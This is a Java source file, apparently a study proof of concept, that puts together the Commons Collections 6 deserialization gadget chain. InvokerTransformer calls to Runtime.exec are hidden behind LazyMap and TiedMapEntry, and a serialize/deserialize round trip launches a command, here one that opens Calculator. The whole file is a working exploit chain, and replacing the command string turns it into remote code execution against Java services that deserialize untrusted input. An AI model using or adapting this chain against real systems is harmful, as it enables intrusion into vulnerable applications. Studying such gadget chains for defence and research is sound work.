package com.rain;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws Exception{

        Transformer[] transformers={
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map lazyMap = LazyMap.decorate(map,  new ConstantTransformer(1) );

        TiedMapEntry tidemapentry = new TiedMapEntry(lazyMap, "raindrop");
        HashMap map1 = new HashMap();
        map1.put(tidemapentry,"abc");

        Class c = LazyMap.class;
        Field factoryField = c.getDeclaredField("factory");
        factoryField.setAccessible(true);
        factoryField.set(lazyMap,chainedTransformer);
        map.remove("raindrop");

        Utils.serialize(map1);
        Utils.deserialize();
    }

}
